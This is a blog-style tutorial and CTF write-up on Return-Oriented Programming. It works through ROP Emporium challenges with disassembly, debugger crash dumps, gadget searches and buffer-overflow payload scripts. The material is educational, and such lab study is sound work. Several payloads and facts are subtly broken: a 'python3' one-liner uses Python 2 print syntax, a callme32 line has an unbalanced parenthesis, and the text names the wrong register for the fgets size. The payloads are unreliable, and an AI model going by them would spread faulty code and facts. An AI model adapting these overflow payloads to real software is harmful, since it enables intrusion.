---
layout: post
title: Return Oriented Programming
---

## Notes
- This article assumes you are familiar with Assembly and basic concepts in reverse enginering and binary analysis.
- To continue learning about ROP, [ROP emporium](https://ropemporium.com/) provides a series of challenges for learning ROP. 

In this article, you fill find solutions and explanations to some of the challenges.


##  Intro
Return-Oriented Programming (ROP) is an advanced memory attack technique that allows an attacker to execute code under various common defenses of modern operating systems, such as non-executable memory and code signing. This type of attack often exploits program loopholes in the operation stack call, usually a buffer overflow. An attacker controls stack calls to hijack program control flow and execute targeted machine language instruction sequences (gadgets). Each gadget usually ends with a return instruction (`ret` , machine code `c3`) and is located in a subroutine in the shared library code. The execution of these instruction sequences, allows an attacker to controll the execution of the program. 

- `ret` instruction is equivalent to `pop eip`. The 4-byte content pointed to by `esp` is first read and assigned to `eip` , and then the `esp` plus 4 bytes points to the next position on the stack. If the currently executing instruction sequence still ends with the `ret` instruction, this process will be repeated, `esp` incremented again and the next instruction sequence is executed.


## Challenges

### ret2win32
Under normal circumstances, for a program with buffer overflow, we usually enter a certain number of characters to fill the buffer, 
and then construct an ROP chain by overwriting the return address saved on the stack. I will go through some more details in the first challenge as these principles are common denominators when thinking about subsequent challenges.

Let's take a look at the vulnerability function:

```
adrazhi$ disassemble pwnme Dump of assembler code for function pwnme: 0x080485f6 <+0>: push ebp 0x080485f7 <+1>: mov ebp,esp 0x080485f9 <+3>: sub esp,0x28 0x080485fc <+6>: sub esp,0x4 0x080485ff <+9>: push 0x20 0x08048601 <+11>: push 0x0 0x08048603 <+13>: lea eax,[ebp-0x28] 0x08048606 <+16>: push eax 0x08048607 <+17>: call 0x8048460 <memset@plt> 0x0804860c <+22>: add esp,0x10 0x0804860f <+25>: sub esp,0xc 0x08048612 <+28>: push 0x804873c 0x08048617 <+33>: call 0x8048420 <puts@plt> 0x0804861c <+38>: add esp,0x10 0x0804861f <+41>: sub esp,0xc 0x08048622 <+44>: push 0x80487bc 0x08048627 <+49>: call 0x8048420 <puts@plt> 0x0804862c <+54>: add esp,0x10 0x0804862f <+57>: sub esp,0xc 0x08048632 <+60>: push 0x8048821 0x08048637 <+65>: call 0x8048400 <printf@plt> 0x0804863c <+70>:
```

The function `pwnme()` is a buffer overflow function. It calls `fgets()` read arbitrary data, but the buffer size is only 40 bytes ( 0x0804864a <+84>: lea eax,[ebp-0x28] , 0x28 = 40), When inputting more than 40 bytes of data, you can overwrite the ebp and return address of the calling function:

```
adrazhi$ pattern_create 50 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
```

The buffers are offset from `ebp` and `eip` by 40 and 44 respectively, which validates the hypothesis.

By looking at the logic of the program, although the function `ret2win()` exists in the `.text` section, it is not called during program execution. All we have to do is to overwrite the return address with the address of the function to make the program jump to In the function, which prints the flag, we call this type of ROP `ret2text`.

```
 adrazhi$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial 
```

Here, PIE is turned on and off, so the loading address of `.text` is unchanged. You can directly use the address `0x08048659 ret2win()`
The payload is as follows (note the paylaod in this article I will use multiple methods to write to show the use of various tools):

```
adrazhi$ python3 -c "print 'A'*44 + '\x59\x86\x04\x08'" | ./ret2win32 ... > Thank you! Here's your flag:ROP{a_placeholder_32byte_flag!}
```

### ret2win
Let's look at 64-bit program. 

```
adrazhi$ disassemble pwnme Dump of assembler code for function pwnme: 0x00000000004007b5 <+0>: push rbp 0x00000000004007b6 <+1>: mov rbp,rsp 0x00000000004007b9 <+4>: sub rsp,0x20 0x00000000004007bd <+8>: lea rax,[rbp-0x20] 0x00000000004007c1 <+12>: mov edx,0x20 0x00000000004007c6 <+17>: mov esi,0x0 0x00000000004007cb <+22>: mov rdi,rax 0x00000000004007ce <+25>: call 0x400600 <memset@plt> 0x00000000004007d3 <+30>: mov edi,0x4008f8 0x00000000004007d8 <+35>: call 0x4005d0 <puts@plt> 0x00000000004007dd <+40>: mov edi,0x400978 0x00000000004007e2 <+45>: call 0x4005d0 <puts@plt> 0x00000000004007e7 <+50>: mov edi,0x4009dd 0x00000000004007ec <+55>: mov eax,0x0 0x00000000004007f1 <+60>: call 0x4005f0 <printf@plt> 0x00000000004007f6 <+65>: mov rdx,QWORD PTR [rip+0x200873] # 0x601070 <stdin@@GLIBC_2.2.5> 0x00000000004007fd <+72>: lea rax,[rbp-0x20] 0x0000000000400801 <+76>:
```

The first difference from 32-bit is parameter passing. The first six parameters of 64-bit programs are passed through RDI, RSI, RDX, RCX, R8 and R9. So the buffer size parameter is passed to `fgets()` via `rdi`, and the size is 32 bytes.

And because the address of ret does not exist, the program stops at this step => `0x400810 <pwnme+91>: ret` , because the 64-bit usable memory address cannot be greater than `0x00007fffffffffff` , otherwise an exception will be thrown.

```
 adrazhi$ r Starting program: /home/firmy/Desktop/rop_emporium/ret2win/ret2win ret2win by ROP Emporium 64bits For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer; What could possibly go wrong? You there madam, may I have your input please? And don't worry about null bytes, we're using fgets! > AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] RAX: 0x7fffffffe400 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb") RBX: 0x0 RCX: 0x1f RDX: 0x7ffff7dd4710 --> 0x0 RSI: 0x7fffffffe400 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb") RDI: 0x7fffffffe401 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb") RBP: 0x6141414541412941 ('A)AAEAAa') RSP: 0x7fffffffe428 ("AA0AAFAAb") RIP: 0x400810 (<pwnme+91>: ret) R8 : 0x0 R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0) R10: 0x602260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n") R11: 0x246 R12: 0x400650 (<_start>: xor ebp,ebp) R13: 0x7fffffffe510 --> 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400809 <pwnme+84>: call 0x400620 <fgets@plt> 0x40080e <pwnme+89>: nop 0x40080f <pwnme+90>: leave => 0x400810 <pwnme+91>: ret 0x400811 <ret2win>: push rbp 0x400812 <ret2win+1>: mov rbp,rsp 0x400815 <ret2win+4>: mov edi,0x4009e0 0x40081a <ret2win+9>: mov eax,0x0 [------------------------------------stack-------------------------------------] 0000| 0x7fffffffe428 ("AA0AAFAAb") 0008| 0x7fffffffe430 --> 0x400062 --> 0x1f8000000000000 0016| 0x7fffffffe438 --> 0x7ffff7a41f6a (<__libc_start_main+234>: mov edi,eax) 0024| 0x7fffffffe440 --> 0x0 0032| 0x7fffffffe448 --> 0x7fffffffe518 --> 0x7fffffffe870 ("/home/firmy/Desktop/rop_emporium/ret2win/ret2win") 0040| 0x7fffffffe450 --> 0x100000000 0048| 0x7fffffffe458 --> 0x400746 (<main>: push rbp) 0056| 0x7fffffffe460 --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x0000000000400810 in pwnme () gdb-peda$ pattern_offset $rbp 7007954260868540737 found at offset: 32 gdb-peda$ pattern_offset AA0AAFAAb AA0AAFAAb found at offset: 40 

```

The address of `re2win()` is `0x0000000000400811` , and the payload is as follows:

```python
 from zio import * payload = "A" * 40 + l64( 0x0000000000400811 ) 
 io = zio('./ret2win') 
 io.writeline(payload) io.read() 
```


### callme32
Here we are going to touch the real plt. According to the question, `callme32` imports three special functions from the shared library `libcallme32.so:s`

```
 adrazhi$ rabin2 -i callme32 | grep callme ordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_three ordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one ordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two 
```

All we have to do is call `callme_one()` , `callme_two()` and `callme_three()`, and each function must pass parameters 1, 2, 3. Through debugging, we can know the function logic, `callme_one` used to read the encrypted flag, and then call `callme_two` and `callme_three` order to decrypt.

Since the function parameters are placed on the stack, in order to balance the stack, we need a `pop;pop;pop;ret` gadge

```
adrazhi$ objdump -d callme32 | grep -A 3 pop ... 80488a8: 5b pop %ebx 80488a9: 5e pop %esi 80488aa: 5f pop %edi 80488ab: 5d pop %ebp 80488ac: c3 ret 80488ad: 8d 76 00 lea 0x0(%esi),%esi ... 
```
Or add `esp, 8; pop; ret`, anyway, as long as it can be balanced, you can:

```
 adrazhi$ ropsearch "add esp, 8" Searching for ROP gadget: 'add esp, 8' in: binary ranges 0x08048576 : (b'83c4085bc3') add esp,0x8; pop ebx; ret 0x080488c3 : (b'83c4085bc3') add esp,0x8; pop ebx; ret 
```

Constructing the payload: 

```python
 from zio import * payload = "A" * 44 payload += l32(0x080485c0) 
 payload += l32(0x080488a9) 
 payload += l32(0x1 + l32(0x2) + l32(0x3) 
 payload += l32(0x08048620) 
 payload += l32(0x080488a9) 
 payload += l32(0x1) + l32(0x2) + l32(0x3) 
 payload += l32(0x080485b0) 
 payload += l32(0x080488a9) 
 payload += l32(0x1 ) + l32(0x2) + l32(0x3) 
 io = zio( './callme32' ) 
 io.writeline(payload) io.read() 

```


## Conclusion
Will be going through some of the additional challenges. ROP is a cool technique and in case you are interested in diving deeper
[Return-Oriented Programming: Systems, Languages, and Applications](https://hovav.net/ucsd/dist/rop.pdf) can be a useful resource.



















